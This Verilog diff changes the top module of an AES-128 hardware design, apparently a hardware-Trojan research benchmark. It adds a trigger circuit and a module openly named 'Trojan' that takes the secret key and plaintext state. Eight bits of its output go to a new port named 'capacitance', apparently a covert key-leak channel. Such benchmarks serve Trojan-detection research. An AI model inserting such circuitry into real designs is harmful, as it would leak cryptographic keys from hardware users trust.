@@ -3,7 +3,7 @@
 // Company: 
 // Engineer: 
 // 
-// Create Date:    18:35:35 03/08/2013 
+// Create Date:    12:02:52 03/06/2013 
 // Design Name: 
 // Module Name:    top 
 // Project Name: 
@@ -18,14 +18,17 @@
 // Additional Comments: 
 //
 //////////////////////////////////////////////////////////////////////////////////
-module top(clk, rst, state_change, key_change, out);
+
+
+module top(clk, rst, state_change, key_change, out, capacitance);
     input clk, rst, state_change, key_change;
-	output out;
+	output out, capacitance;
+	wire [7:0] capacitance;
     reg  [127:0] state, key;
 	wire [127:0] aes_out;
-
+    wire [63:0] Capacitance;
+    wire Tj_Trig;
 	aes_128 AES (clk, state, key, aes_out);
-	TSC Trojan (clk, rst, out);
 
 	always @ (posedge clk)
 		begin
@@ -43,7 +46,21 @@ module top(clk, rst, state_change, key_change, out);
 				state <= state + 128'd1;
 		end
 
+
+    Trojan_Trigger Trigger (rst, state, Tj_Trig); 
+	TSC Trojan (rst, clk, Tj_Trig, key, state, Capacitance); 
+
 	assign out = ^aes_out;
+    assign capacitance[0] = Capacitance[0];
+    assign capacitance[1] = Capacitance[8];
+    assign capacitance[2] = Capacitance[16];
+    assign capacitance[3] = Capacitance[24];
+    assign capacitance[4] = Capacitance[32];
+    assign capacitance[5] = Capacitance[40];
+    assign capacitance[6] = Capacitance[48];
+    assign capacitance[7] = Capacitance[56];
+    
+
+
 
 endmodule
-
